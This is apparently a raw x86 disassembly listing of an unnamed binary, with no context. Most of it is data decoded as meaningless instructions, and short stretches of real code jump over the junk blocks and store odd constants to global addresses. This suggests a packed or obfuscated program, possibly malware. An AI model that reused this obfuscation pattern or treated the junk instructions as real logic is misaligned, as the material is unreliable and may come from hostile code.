  40a595:	outs   dx,DWORD PTR ds:[esi]
  40a596:	push   ecx
  40a597:	pop    esi
  40a598:	jno    0x40a5db
  40a59a:	fsubr  DWORD PTR [ebp+0x78]
  40a59d:	inc    eax
  40a59e:	jg     0x40a57e
  40a5a0:	(bad)  
  40a5a2:	jne    0x40a585
  40a5a4:	mov    eax,ds:0x59925add
  40a5a9:	pop    edi
  40a5aa:	mov    esp,0x261594a
  40a5af:	les    edi,FWORD PTR [ecx]
  40a5b1:	xchg   ebp,eax
  40a5b2:	sbb    BYTE PTR ds:0x13e9006e,bh
  40a5b8:	fadd   QWORD PTR [eax+0x5d]
  40a5bb:	outs   dx,BYTE PTR ds:[esi]
  40a5bc:	fs mov dh,0x67
  40a5bf:	ret    
  40a5c0:	push   ecx
  40a5c1:	xchg   ebx,eax
  40a5c2:	imul   edx,DWORD PTR [si+0x55],0x7e
  40a5c7:	pop    ds
  40a5c8:	hlt    
  40a5c9:	add    BYTE PTR [eax],ah
  40a5cb:	mov    ecx,0x92dc57ee
  40a5d0:	popa   
  40a5d1:	jne    0x40a5b9
  40a5d3:	ret    
  40a5d4:	jmp    0x40a620
  40a5d6:	lods   eax,DWORD PTR ds:[esi]
  40a5d7:	imul   eax,DWORD PTR [ecx+ecx*1-0x73079f32],0x11c67d37
  40a5e2:	outs   dx,DWORD PTR ds:[esi]
  40a5e3:	inc    eax
  40a5e4:	sub    DWORD PTR [ecx],ecx
  40a5e6:	cmp    al,0x59
  40a5e8:	inc    esp
  40a5e9:	les    edi,FWORD PTR [esi+0x268c44f1]
  40a5ef:	nop
  40a5f0:	adc    BYTE PTR [ebx],bh
  40a5f2:	call   0x6f7b7437
  40a5f7:	shr    BYTE PTR [ebx-0x3acf167b],1
  40a5fd:	dec    esi
  40a5fe:	je     0x40a585
  40a600:	mov    al,0x7a
  40a602:	ds pop ds
  40a604:	push   cs
  40a605:	xor    edi,DWORD PTR [esi-0x509f30a]
  40a60b:	add    ecx,esi
  40a60d:	inc    esp
  40a60e:	lds    eax,FWORD PTR [eax+0x13a2d623]
  40a614:	pop    esi
  40a615:	mov    cl,BYTE PTR [eax]
  40a617:	adc    al,0xb8
  40a619:	xchg   edi,eax
  40a61a:	loop   0x40a622
  40a61c:	ret    0x7fca
  40a61f:	and    ebp,edi
  40a621:	sbb    BYTE PTR [ebx+ebx*1],ah
  40a624:	cmp    eax,0xa9264cdc
  40a629:	jnp    0x40a682
  40a62b:	call   0x34f1c774
  40a630:	dec    eax
  40a631:	or     BYTE PTR [ebp+0x57],ch
  40a634:	fisub  DWORD PTR cs:[esi+eiz*8]
  40a638:	adc    esp,edx
  40a63a:	adc    al,0xfd
  40a63c:	mov    al,ds:0xa0b0df40
  40a641:	sbb    dh,BYTE PTR [ebx]
  40a643:	dec    ebp
  40a644:	rcr    bl,0xe
  40a647:	fld    DWORD PTR [eax-0x58b23172]
  40a64d:	das    
  40a64e:	dec    eax
  40a64f:	sub    DWORD PTR [esi],0x3bbab854
  40a655:	outs   dx,BYTE PTR ds:[esi]
  40a656:	adc    al,0x35
  40a658:	int    0x6d
  40a65a:	cli    
  40a65b:	dec    bp
  40a65d:	pop    eax
  40a65e:	push   ss
  40a65f:	jp     0x40a637
  40a661:	fwait
  40a662:	imul   DWORD PTR [edx-0x5e74ddf7]
  40a668:	adc    esi,ecx
  40a66a:	pop    edi
  40a66b:	mov    esi,0x4cc169ee
  40a670:	mov    bl,0x9e
  40a672:	lock jg 0x40a6d7
  40a675:	mov    esp,0x2241cc01
  40a67a:	inc    esi
  40a67b:	fst    DWORD PTR [ebx-0x7ca55f8e]
  40a681:	loopne 0x40a6c2
  40a683:	inc    edx
  40a684:	popf   
  40a685:	mov    BYTE PTR [ebp+0x42],bh
  40a688:	arpl   WORD PTR [esi+0x3b],bp
  40a68b:	lods   eax,DWORD PTR ds:[esi]
  40a68c:	out    0xd4,al
  40a68e:	adc    dh,0x8d
  40a691:	hlt    
  40a692:	mov    ch,0x51
  40a694:	mov    cl,BYTE PTR [eax+0x7f0bd97c]
  40a69a:	bound  edi,QWORD PTR [ecx]
  40a69c:	push   eax
  40a69d:	dec    esp
  40a69e:	mov    al,ds:0x8e12b843
  40a6a3:	ds cs data16 aaa 
  40a6a7:	(bad)  
  40a6a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6a9:	into   
  40a6aa:	ret    0x3ad0
  40a6ad:	push   ebx
  40a6ae:	adc    DWORD PTR [ecx-0x17fc84bc],eax
  40a6b4:	sbb    dl,BYTE PTR [edi-0x51fc79d2]
  40a6ba:	dec    esp
  40a6bb:	add    edi,esi
  40a6bd:	add    esi,eax
  40a6bf:	xor    BYTE PTR [edx+0x18ef4c51],bl
  40a6c5:	rcl    bl,1
  40a6c7:	lods   al,BYTE PTR ds:[esi]
  40a6c8:	neg    DWORD PTR [edi+0x62187986]
  40a6ce:	xchg   ecx,eax
  40a6cf:	mov    eax,ds:0xf01403bb
  40a6d4:	lock ret 0x6f93
  40a6d8:	(bad)  
  40a6d9:	xchg   ebp,eax
  40a6da:	aas    
  40a6db:	xor    eax,0x118da711
  40a6e0:	xchg   ebp,eax
  40a6e1:	xchg   edi,eax
  40a6e2:	sahf   
  40a6e3:	xchg   ebx,eax
  40a6e4:	rcl    BYTE PTR [ecx+0x68b10863],cl
  40a6ea:	add    esi,DWORD PTR [edi-0x3807c411]
  40a6f0:	add    eax,0x43376b
  40a6f5:	test   al,0x5a
  40a6f7:	add    BYTE PTR [eax],al
  40a6f9:	jne    0x40b4e6
  40a6ff:	adc    DWORD PTR ds:0x433757,0xbfa
  40a709:	push   DWORD PTR [ebp+0x8]
  40a70c:	add    DWORD PTR ds:0x4337e7,0x7522
  40a716:	call   0x4115fc
  40a71b:	sbb    ecx,0x1aca
  40a721:	mov    DWORD PTR [ebp-0x20],eax
  40a724:	mov    eax,DWORD PTR [ebp-0x4]
  40a727:	xor    esi,esi
  40a729:	xor    esi,DWORD PTR ds:0x433817
  40a72f:	or     DWORD PTR ds:0x433823,esi
  40a735:	mov    ecx,DWORD PTR [ebp-0x20]
  40a738:	mov    esi,0x7510854
  40a73d:	xor    eax,esi
  40a73f:	add    DWORD PTR ds:0x433813,0x433707
  40a749:	add    eax,ebx
  40a74b:	mov    DWORD PTR ds:0x4337af,0x4f05
  40a755:	cmp    ecx,eax
  40a757:	mov    DWORD PTR ds:0x433767,0x525
  40a761:	je     0x40b9ed
  40a767:	add    DWORD PTR ds:0x4337ef,0x3590
  40a771:	push   DWORD PTR [ebp-0x20]
  40a774:	xor    DWORD PTR ds:0x4336ff,0x1906
  40a77e:	push   DWORD PTR [ebp+0x8]
  40a781:	dec    DWORD PTR ds:0x4337db
  40a787:	call   0x40eac8
  40a78c:	movzx  ecx,WORD PTR ds:0x43370b
  40a793:	sub    DWORD PTR ds:0x433723,ecx
  40a799:	jmp    0x40a9fc
  40a79e:	or     al,0xd4
  40a7a0:	and    ah,bl
  40a7a2:	loopne 0x40a78c
  40a7a4:	shl    ah,1
  40a7a6:	sti    
  40a7a7:	and    eax,0x60eaec0c
  40a7ac:	and    ch,BYTE PTR [eax+0x16]
  40a7af:	in     eax,dx
  40a7b0:	jle    0x40a830
  40a7b2:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a7b6:	jns    0x40a777
  40a7b8:	repz cwde 
  40a7ba:	xchg   edx,eax
  40a7bb:	loop   0x40a812
  40a7bd:	cmp    DWORD PTR [ebx+0x5f2a89ef],0x38029b18
  40a7c7:	add    eax,0x473e4d07
  40a7cc:	lods   al,BYTE PTR ds:[esi]
  40a7cd:	adc    al,0x45
  40a7cf:	add    edi,DWORD PTR [ebx-0x528ed653]
  40a7d5:	mov    fs,WORD PTR [ebx+0x42]
  40a7d8:	bound  eax,QWORD PTR [ecx-0x36]
  40a7db:	in     eax,0x22
  40a7dd:	mov    eax,0x1c6ce048
  40a7e2:	sbb    esi,DWORD PTR ds:0xec247732
  40a7e8:	jmp    0xdadd4ee2
  40a7ed:	std    
  40a7ee:	daa    
  40a7ef:	stos   BYTE PTR es:[edi],al
  40a7f0:	or     BYTE PTR [ebp+0x54],ah
  40a7f3:	fstp   DWORD PTR [eax-0x5e]
  40a7f6:	mov    ds:0x2e4e4531,al
  40a7fb:	dec    ecx
  40a7fc:	fld    TBYTE PTR [esi]
  40a7fe:	scas   eax,DWORD PTR es:[edi]
  40a7ff:	add    BYTE PTR [ecx],al
  40a801:	xor    edx,DWORD PTR [eax+0x3928f1e5]
  40a807:	adc    BYTE PTR [esi],cl
  40a809:	jbe    0x40a7dc
  40a80b:	xchg   edx,eax
  40a80c:	add    DWORD PTR [edi-0x61492958],esi
  40a812:	imul   edx,DWORD PTR [eax-0x8b52d2],0xffffffbf
  40a819:	inc    ebx
  40a81a:	dec    ebp
  40a81b:	test   DWORD PTR [eax-0x45],0xb559c3af
  40a822:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a823:	jmp    0xda91:0xbe629e3f
  40a82a:	ss or  eax,0x98ddfb75
  40a830:	xor    DWORD PTR [ebx+0x7da9963a],ebp
  40a836:	test   BYTE PTR gs:[ecx-0x53ef7230],dh
  40a83d:	dec    eax
  40a83e:	sbb    ebx,edi
  40a840:	ror    DWORD PTR [eax+0x40e9dc44],cl
  40a846:	push   edx
  40a847:	and    BYTE PTR [ebx],al
  40a849:	in     al,dx
  40a84a:	cs pushf 
  40a84c:	(bad)  
  40a84d:	push   es
  40a84e:	adc    DWORD PTR ds:0xfce03d97,edx
  40a854:	in     al,dx
  40a855:	arpl   WORD PTR [esi],bp
  40a857:	pop    ss
  40a858:	or     BYTE PTR [ebx],ch
  40a85a:	fwait
  40a85b:	sub    al,0x75
  40a85d:	xor    al,0xf7
  40a85f:	ja     0x40a8c8
  40a861:	hlt    
  40a862:	and    bh,BYTE PTR [eax-0x1614ddc3]
  40a868:	popa   
  40a869:	mov    DWORD PTR [ebx],edi
  40a86b:	ins    BYTE PTR es:[edi],dx
  40a86c:	pop    eax
  40a86d:	push   ecx
  40a86e:	push   esi
  40a86f:	icebp  
  40a870:	jne    0x40a812
  40a872:	dec    edx
  40a873:	aad    0xfa
  40a875:	xor    al,0x68
  40a877:	daa    
  40a878:	mov    ecx,ebx
  40a87a:	nop
  40a87b:	cvtps2pi mm5,QWORD PTR [eax]
  40a87e:	dec    edi
  40a87f:	jge    0x40a865
  40a881:	sar    dl,0xa3
  40a884:	shl    BYTE PTR [ebp+0x6c],0xf7
  40a888:	into   
  40a889:	popa   
  40a88a:	das    
  40a88b:	xchg   edx,eax
  40a88c:	pushf  
  40a88d:	data16 je 0x40a85d
  40a890:	ret    
  40a891:	inc    ebp
  40a892:	dec    ebx
  40a893:	arpl   sp,cx
  40a895:	cmp    eax,0xe5739a4a
  40a89a:	dec    ecx
  40a89b:	pop    edi
  40a89c:	dec    ecx
  40a89d:	dec    esp
  40a89e:	(bad)  
  40a89f:	jle    0x40a8f7
  40a8a1:	jg     0x40a85e
  40a8a3:	dec    esp
  40a8a4:	iret   
  40a8a5:	aaa    
  40a8a6:	sbb    al,0xb
  40a8a8:	lock shl DWORD PTR [ebp+0x26],cl
  40a8ac:	inc    eax
  40a8ad:	xor    dh,BYTE PTR [eax+0x10]
  40a8b0:	mov    eax,0xcac3df63
  40a8b5:	mov    DWORD PTR [edx+0x10],0xbdedcb35
  40a8bc:	pop    ebp
  40a8bd:	or     eax,0x4b36223d
  40a8c2:	adc    al,0x33
  40a8c4:	pop    ebp
  40a8c5:	xlat   BYTE PTR ds:[ebx]
  40a8c6:	test   DWORD PTR [ecx+0x434a8fdc],0xe86b95c7
  40a8d0:	mov    edx,0x6581a027
  40a8d5:	out    0x6e,al
  40a8d7:	stos   DWORD PTR es:[edi],eax
  40a8d8:	or     eax,0x48d1f1a7
  40a8dd:	mov    al,ds:0x9855a7ea
  40a8e2:	cmp    al,0x5d
  40a8e4:	cld    
  40a8e5:	or     ecx,ebx
  40a8e7:	addr16 xchg esi,eax
  40a8e9:	cmp    cl,BYTE PTR [eax+0x69]
  40a8ec:	cmp    DWORD PTR [esi],edi
  40a8ee:	mov    cl,0xf8
  40a8f0:	retf   0xf015
  40a8f3:	xor    BYTE PTR [eax+ecx*4+0x39],dh
  40a8f7:	xchg   esp,eax
  40a8f8:	leave  
  40a8f9:	enter  0xf5bd,0xde
  40a8fd:	ss dec ebx
  40a8ff:	inc    eax
  40a900:	retf   
  40a901:	ret    
  40a902:	adc    BYTE PTR [edi+edi*4],al
  40a905:	jne    0x40a88c
  40a907:	push   cs
  40a908:	and    eax,0x46ee28cb
  40a90d:	les    esi,FWORD PTR [ecx-0x30e24ba8]
  40a913:	or     al,0xb2
  40a915:	in     eax,0xb5
  40a917:	in     al,0x9a
  40a919:	loope  0x40a8d5
  40a91b:	leave  
  40a91c:	cmp    DWORD PTR [edx+esi*4+0x77],edi
  40a920:	xor    BYTE PTR [edi],0xb6
  40a923:	outs   dx,BYTE PTR ds:[esi]
  40a924:	pop    ss
  40a925:	popf   
  40a926:	xchg   edi,eax
  40a927:	jnp    0x40a9a2
  40a929:	mov    al,0x76
  40a92b:	jg     0x40a961
  40a92d:	je     0x40a948
  40a92f:	js     0x40a931
  40a931:	pop    esp
  40a932:	pop    esi
  40a933:	imul   ebx,DWORD PTR [ecx-0x655f1e6],0xffffff8d
  40a93a:	pop    ebp
  40a93b:	pusha  
  40a93c:	stos   DWORD PTR es:[edi],eax
  40a93d:	inc    edx
  40a93e:	out    dx,eax
  40a93f:	sar    BYTE PTR ds:0x6dd7da18,0x6b
  40a946:	pop    es
  40a947:	sbb    al,0x40
  40a949:	cmp    eax,DWORD PTR [ecx]
  40a94b:	xchg   ebx,eax
  40a94c:	or     BYTE PTR [eax-0xe],cl
  40a94f:	and    DWORD PTR [eax+ecx*2+0x116c5572],edx
  40a956:	cmp    ebp,eax
  40a958:	dec    ebp
  40a959:	mov    al,ds:0x2cc8dbd0
  40a95e:	sbb    al,BYTE PTR [ecx+0x51]
  40a961:	sub    bh,dh
  40a963:	sahf   
  40a964:	push   ds
  40a965:	add    edi,DWORD PTR [ecx]
  40a967:	out    0xac,al
  40a969:	cmp    DWORD PTR [edx-0x4a],esi
  40a96c:	push   ss
  40a96d:	sub    ch,bh
  40a96f:	pop    ebp
  40a970:	xor    al,0x55
  40a972:	pop    ebp
  40a973:	sar    DWORD PTR [ecx],0x79
  40a976:	push   0x3c
  40a978:	mov    dh,0xb5
  40a97a:	pop    esi
  40a97b:	push   ebx
  40a97c:	push   ebp
  40a97d:	mov    edx,eax
  40a97f:	sbb    edx,ebx
  40a981:	stos   BYTE PTR es:[edi],al
  40a982:	call   0xd674691
  40a987:	jne    0x40a96f
  40a989:	cdq    
  40a98a:	imul   esi,DWORD PTR [esi-0x28],0xffffff95
  40a98e:	pop    eax
  40a98f:	std    
  40a990:	add    eax,0x746a3756
  40a995:	outs   dx,BYTE PTR ds:[esi]
  40a996:	mov    BYTE PTR [esi],al
  40a998:	jle    0x40a9b2
  40a99a:	pop    ebp
  40a99b:	push   es
  40a99c:	outs   dx,BYTE PTR ds:[esi]
  40a99d:	imul   esp,DWORD PTR [ecx],0x4ad18ccf
  40a9a3:	cs ds inc ebx
  40a9a6:	dec    ecx
  40a9a7:	clc    
  40a9a8:	ret    0xdab2
  40a9ab:	xor    cl,BYTE PTR [ebx-0x5587244f]
  40a9b1:	fistp  QWORD PTR [eax]
  40a9b3:	inc    ebp
  40a9b4:	lahf   
  40a9b5:	in     al,0x1a
  40a9b7:	fisub  WORD PTR [eiz*1+0x1d092588]
  40a9be:	cs jmp 0x40aa27
  40a9c1:	pop    es
  40a9c2:	ror    BYTE PTR [edi+0x4e],0x28
  40a9c6:	sbb    al,0x1f
  40a9c8:	push   edi
  40a9c9:	and    BYTE PTR [edi],dh
  40a9cb:	stos   BYTE PTR es:[edi],al
  40a9cc:	sub    DWORD PTR [esi+0x70],esi
  40a9cf:	add    eax,ecx
  40a9d1:	inc    eax
  40a9d2:	(bad)  
  40a9d3:	js     0x40a980
  40a9d5:	push   ebp
  40a9d6:	jbe    0x40aa11
  40a9d8:	jno    0x40a995
  40a9da:	out    dx,al
  40a9db:	shl    DWORD PTR [ecx-0x2668d0d0],cl
  40a9e1:	outs   dx,DWORD PTR ds:[esi]
  40a9e2:	stos   BYTE PTR es:[edi],al
  40a9e3:	dec    DWORD PTR gs:[ecx+0x7f43b4e1]
  40a9ea:	sub    esi,DWORD PTR [edx+0x6c33a0f8]
  40a9f0:	dec    edx
  40a9f1:	pop    es
  40a9f2:	cmp    dl,BYTE PTR [ecx-0x73]
  40a9f5:	pop    edi
  40a9f6:	lock push esp
  40a9f8:	sub    BYTE PTR [eax],dl
  40a9fa:	inc    ebx
  40a9fb:	dec    edi
  40a9fc:	mov    DWORD PTR [ebp-0x14],eax
  40a9ff:	mov    eax,DWORD PTR [ebp-0x4]
  40aa02:	xor    DWORD PTR ds:0x433717,edi
  40aa08:	mov    ecx,DWORD PTR [ebp-0x14]
  40aa0b:	xor    eax,esi
  40aa0d:	adc    DWORD PTR ds:0x433817,0x4337e7
  40aa17:	add    eax,ebx
  40aa19:	mov    DWORD PTR ds:0x433767,0x6600
  40aa23:	jmp    0x40ac86
  40aa28:	dec    ebp
  40aa29:	ret    
  40aa2a:	xchg   esp,eax
  40aa2b:	push   eax
  40aa2c:	nop
  40aa2d:	push   ecx
  40aa2e:	dec    ecx
  40aa2f:	ret    
  40aa30:	mov    esp,DWORD PTR es:[edx+eiz*2]
  40aa34:	ret    
  40aa35:	fisubr WORD PTR [edx]
  40aa37:	xchg   esp,eax
  40aa38:	shr    bl,1
  40aa3a:	jle    0x40aaba
  40aa3c:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40aa40:	test   BYTE PTR [edi+eiz*2-0xba9bd37],0x7
  40aa48:	pop    esp
  40aa49:	leave  
  40aa4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa4b:	jne    0x40aa44
  40aa4d:	hlt    
  40aa4e:	stos   DWORD PTR es:[edi],eax
  40aa4f:	(bad)  
  40aa50:	scas   eax,DWORD PTR es:[edi]
  40aa51:	mov    cl,0xc
  40aa53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa54:	sub    ecx,DWORD PTR [ebx]
  40aa56:	push   esi
  40aa57:	in     eax,0xe1
  40aa59:	jbe    0x40aa6e
  40aa5b:	or     dh,BYTE PTR [ebx]
  40aa5d:	or     DWORD PTR [edi+0x1004f441],ecx
  40aa63:	and    eax,0xfbd183f3
  40aa68:	pusha  
  40aa69:	bound  edi,QWORD PTR [esi+0x2b]
  40aa6c:	fwait
  40aa6d:	sbb    BYTE PTR [edi],bl
  40aa6f:	dec    edx
  40aa70:	in     al,dx
  40aa71:	enterw 0xbbf8,0xd6
  40aa76:	aaa    
  40aa77:	rol    DWORD PTR [ebx-0x48],1
  40aa7a:	pop    ds
  40aa7b:	sbb    cl,BYTE PTR [edx]
  40aa7d:	ret    0xf69a
  40aa80:	inc    edx
  40aa81:	push   ebp
  40aa82:	out    0x88,al
  40aa84:	and    eax,0x33aadd8f
  40aa89:	shr    DWORD PTR [edi-0x30],1
  40aa8c:	sahf   
  40aa8d:	sti    
  40aa8e:	push   ss
  40aa8f:	and    esi,DWORD PTR ds:0x24a676ff
  40aa95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa96:	push   edi
  40aa97:	lock shl BYTE PTR [ebx+0x480d464f],0x4e
  40aa9f:	data16 out dx,al
  40aaa1:	dec    edx
  40aaa2:	and    BYTE PTR [edx+edi*1-0x2cb1433c],bh
  40aaa9:	and    ch,al
  40aaab:	inc    esp
  40aaac:	imul   eax,DWORD PTR [esi-0x1e9d5e44],0x3b
  40aab3:	inc    eax
  40aab4:	cmp    esp,DWORD PTR [esi+0x6c]
  40aab7:	lock popa 
  40aab9:	int    0x57
  40aabb:	mov    ds:0x5ee679de,eax
  40aac0:	test   BYTE PTR [edi-0x239cb89b],cl
  40aac6:	or     edi,edx
  40aac8:	sbb    al,0xc0
  40aaca:	xchg   ebx,eax
  40aacb:	aam    0x49
  40aacd:	mov    ch,0x7e
  40aacf:	cmp    DWORD PTR [ecx],0x1f
  40aad2:	mov    al,0x7d
  40aad4:	lahf   
  40aad5:	adc    dl,BYTE PTR [ecx+0x7931d299]
  40aadb:	dec    ebx
  40aadc:	xchg   edi,eax
  40aadd:	gs mov esi,0x4cc7f031
  40aae3:	sar    BYTE PTR [ebp-0x43],0x54
  40aae7:	stc    
  40aae8:	and    al,0xb9
  40aaea:	fiadd  WORD PTR [esi+0x31]
  40aaed:	test   edx,ecx
  40aaef:	retf   
  40aaf0:	mov    al,0xc4
  40aaf2:	lods   al,BYTE PTR ds:[esi]
  40aaf3:	or     DWORD PTR [edi+0x6f],ebx
  40aaf6:	(bad)  
  40aaf8:	enter  0xe178,0x5f
  40aafc:	jmp    esp
  40aafe:	out    0x82,al
  40ab00:	ret    0xf406
  40ab03:	xchg   esp,eax
  40ab04:	pop    ecx
  40ab05:	add    edx,ebx
  40ab07:	out    0x49,eax
  40ab09:	std    
  40ab0a:	mov    al,ds:0x4d4abcc
  40ab0f:	shl    DWORD PTR [edi-0x130e977c],cl
  40ab15:	cli    
  40ab16:	push   es
  40ab17:	in     al,0xe3
  40ab19:	leave  
  40ab1a:	dec    ebp
  40ab1b:	mov    eax,ds:0x711eb7e1
  40ab20:	or     BYTE PTR [edi],ah
  40ab22:	jmp    0x2c31:0x4ad6026a
  40ab29:	jnp    0x40ab0d
  40ab2b:	push   esp
  40ab2c:	mov    ah,al
  40ab2e:	leave  
  40ab2f:	mov    ch,0xfb
  40ab31:	fldenv [ebx-0x32]
  40ab34:	std    
  40ab35:	sar    BYTE PTR [eax+0x7685592c],cl
  40ab3b:	fmul   DWORD PTR [ebx+0x4a]
  40ab3e:	or     eax,0x2ac7bab4
  40ab43:	sub    cl,al
  40ab45:	mov    WORD PTR [edi],ss
  40ab47:	mov    bl,0x3a
  40ab49:	aad    0xd0
  40ab4b:	das    
  40ab4c:	cmc    
  40ab4d:	mov    cl,0x78
  40ab4f:	or     eax,0x5fd018c0
  40ab54:	mov    bh,0xca
  40ab56:	push   ebp
  40ab57:	push   ds
  40ab58:	push   esi
  40ab59:	jno    0x40ab37
  40ab5b:	adc    dl,BYTE PTR [eax]
  40ab5d:	add    ebp,DWORD PTR [ebp+0x2bb31608]
  40ab63:	scas   eax,DWORD PTR es:[edi]
  40ab64:	push   edi
  40ab65:	fsubr  st,st(1)
  40ab67:	push   cs
  40ab68:	add    eax,DWORD PTR [ecx-0x54]
  40ab6b:	pop    esi
  40ab6c:	add    al,BYTE PTR [esi+0x2a3c4c30]
  40ab72:	cli    
  40ab73:	dec    ebp
  40ab74:	and    ch,BYTE PTR [ebx]
  40ab76:	xchg   ah,bh
  40ab78:	pop    esi
  40ab79:	lods   al,BYTE PTR ds:[esi]
  40ab7a:	or     dl,bl
  40ab7c:	inc    eax
  40ab7d:	pop    esi
  40ab7e:	mov    dh,0xf8
  40ab80:	hlt    
  40ab81:	cmc    
  40ab82:	stos   BYTE PTR es:[edi],al
  40ab83:	scas   al,BYTE PTR es:[edi]
  40ab84:	out    0xd1,al
  40ab86:	int3   
  40ab87:	or     esi,ebx
  40ab89:	sub    BYTE PTR [ecx],0x4d
  40ab8c:	add    DWORD PTR [ecx-0x664f6283],ecx
  40ab92:	or     al,0xd0
  40ab94:	pushf  
  40ab95:	add    eax,0xefdff98
  40ab9a:	imul   esi,DWORD PTR [ebp-0x2634a2d1],0x5d
  40aba1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aba2:	mov    esp,0x3ae31eb
  40aba7:	and    DWORD PTR [esi+ebx*2],ebp
  40abaa:	lods   al,BYTE PTR ds:[esi]
  40abab:	jl     0x40ab3f
  40abad:	lea    eax,[edx-0x7d4bda7c]
  40abb3:	mov    esi,DWORD PTR [edx+esi*8+0x90eeb93]
  40abba:	into   
  40abbb:	jno    0x40abc7
  40abbd:	inc    ecx
  40abbe:	aaa    
  40abbf:	fadd   DWORD PTR [ecx]
  40abc1:	xor    dl,BYTE PTR [ebx+0xf019962]
  40abc7:	and    eax,0xc996392
  40abcc:	(bad)  
  40abcd:	imul   ebp,DWORD PTR [ebx-0x51a9b0f7],0x1e404216
  40abd7:	inc    ebx
  40abd8:	sub    bl,BYTE PTR [ebx]
  40abda:	cdq    
  40abdb:	in     eax,dx
  40abdc:	adc    al,bh
  40abde:	mov    ah,0xa0
  40abe0:	add    BYTE PTR [ebx],ch
  40abe2:	lods   al,BYTE PTR ds:[esi]
  40abe3:	xor    BYTE PTR [ebx+edi*8],cl
  40abe6:	retf   0x9e8e
  40abe9:	sub    eax,0x4c20efff
  40abee:	in     al,dx
  40abef:	mov    WORD PTR ds:0x2db5b711,cs
  40abf5:	sub    DWORD PTR [eax],0x64041ed0
  40abfb:	sbb    ebx,DWORD PTR [ecx]
  40abfd:	sub    al,0x84
  40abff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac00:	cmp    ah,dl
  40ac02:	and    eax,0xd3da9841
  40ac07:	sbb    al,0x59
  40ac09:	sbb    bh,ah
  40ac0b:	cmc    
  40ac0c:	ja     0x40abf2
  40ac0e:	sub    ecx,esp
  40ac10:	out    dx,eax
  40ac11:	aas    
  40ac12:	(bad)  
  40ac13:	dec    ebx
  40ac14:	xor    ah,al
  40ac16:	push   ecx
  40ac17:	pop    esp
  40ac18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac19:	rol    ebx,0x52
  40ac1c:	or     ah,BYTE PTR [ebx-0x55]
  40ac1f:	add    eax,0xf0887821
  40ac24:	jg     0x40ac91
  40ac26:	iret   
  40ac27:	push   0x910237f4
  40ac2c:	loopne 0x40abd1
  40ac2e:	aas    
  40ac2f:	retf   0xd1be
  40ac32:	mov    al,ds:0x8c18c7c7
  40ac37:	mov    bl,dh
  40ac39:	adc    eax,0xd085a9e2
  40ac3e:	lea    ebx,[ebp+0x3f]
  40ac41:	sub    BYTE PTR [ebp+edx*1-0x3e2b5bcd],dl
  40ac48:	push   DWORD PTR [esi-0x63]
  40ac4b:	jbe    0x40abf1
  40ac4d:	in     eax,0xbf
  40ac4f:	call   0x56ea:0xd62028e1
  40ac56:	mov    dh,0xfa
  40ac58:	stc    
  40ac59:	sbb    DWORD PTR [eax],ebx
  40ac5b:	out    dx,al
  40ac5c:	mov    edx,0x7d04ed26
  40ac61:	xchg   DWORD PTR [ebp+0x77f7b44a],esp
  40ac67:	inc    ebp
  40ac68:	cmp    ah,BYTE PTR [edi+0x31dfd53c]
  40ac6e:	or     al,BYTE PTR [edi]
  40ac70:	int    0xf4
  40ac72:	not    BYTE PTR [ebp+0xc]
  40ac75:	xchg   ebp,eax
  40ac76:	arpl   WORD PTR [ebx-0x77],sp
  40ac79:	mov    ds:0x892bc3a9,eax
  40ac7e:	inc    ecx
  40ac7f:	addr16 push ss
  40ac81:	mov    esi,0x941738c2
  40ac86:	cmp    ecx,eax
  40ac88:	je     0x40b9ed
  40ac8e:	sbb    DWORD PTR ds:0x43376b,0x7413
  40ac98:	mov    eax,DWORD PTR [ebp-0x14]
  40ac9b:	and    DWORD PTR ds:0x4337ef,0x0
  40aca5:	xor    ecx,ecx
  40aca7:	or     ecx,DWORD PTR ds:0x4337ef
  40acad:	inc    ecx
  40acae:	mov    DWORD PTR ds:0x4337ef,ecx
  40acb4:	cmp    DWORD PTR ds:0x4337ef,0x6
  40acbb:	jne    0x40acdb
  40acc1:	push   0x433888
  40acc6:	push   0x4338cc
  40accb:	push   0x3fa4
  40acd0:	push   0x125d
  40acd5:	call   DWORD PTR ds:0x4120e4
  40acdb:	cmp    DWORD PTR ds:0x4337ef,0x5
  40ace2:	jne    0x40acf7
  40ace8:	xor    ecx,ecx
  40acea:	or     ecx,DWORD PTR ds:0x4337ef
  40acf0:	inc    ecx
  40acf1:	mov    DWORD PTR ds:0x4337ef,ecx
  40acf7:	cmp    DWORD PTR ds:0x4337ef,0x1a
  40acfe:	jb     0x40aca5
  40ad04:	adc    DWORD PTR ds:0x43379f,0xf8d
  40ad0e:	jmp    0x40af71
  40ad13:	stos   DWORD PTR es:[edi],eax
  40ad14:	adc    eax,0x70b1f693
  40ad19:	imul   edx,DWORD PTR [ecx+0x53],0x49
  40ad1d:	adc    BYTE PTR [esi+0x1b77fb55],bh
  40ad23:	call   0x7e7c:0x387e7ee9
  40ad2a:	jle    0x40acb4
  40ad2c:	or     bl,BYTE PTR [eax]
  40ad2e:	(bad)  
  40ad2f:	mov    al,ds:0x7e4b1772
  40ad34:	aam    0x2c
  40ad36:	nop
  40ad37:	or     eax,0x42f6f67f
  40ad3c:	shl    DWORD PTR [eax],1
  40ad3e:	pop    ebp
  40ad3f:	push   esi
  40ad40:	inc    ebp
  40ad41:	out    0xb7,eax
  40ad43:	push   ebx
  40ad44:	xor    al,BYTE PTR [esi]
  40ad46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad47:	jnp    0x40acd4
  40ad49:	pop    ecx
  40ad4a:	mov    dh,0xe4
  40ad4c:	fidivr DWORD PTR [edi-0x7666bbbd]
  40ad52:	xor    esp,DWORD PTR [edi-0x53c7fcd7]
  40ad58:	cmp    BYTE PTR [ebp-0x7585ec6],dl
  40ad5e:	jg     0x40ad93
  40ad60:	repnz fidivr WORD PTR [esi-0x3e]
  40ad64:	mov    WORD PTR [esi+0x2f],es
  40ad67:	mov    edx,0x5a5c1fc3
  40ad6c:	pop    ebx
  40ad6d:	repnz xchg ebp,eax
  40ad6f:	adc    DWORD PTR [ecx+0xd0a2d54],0xfffffff1
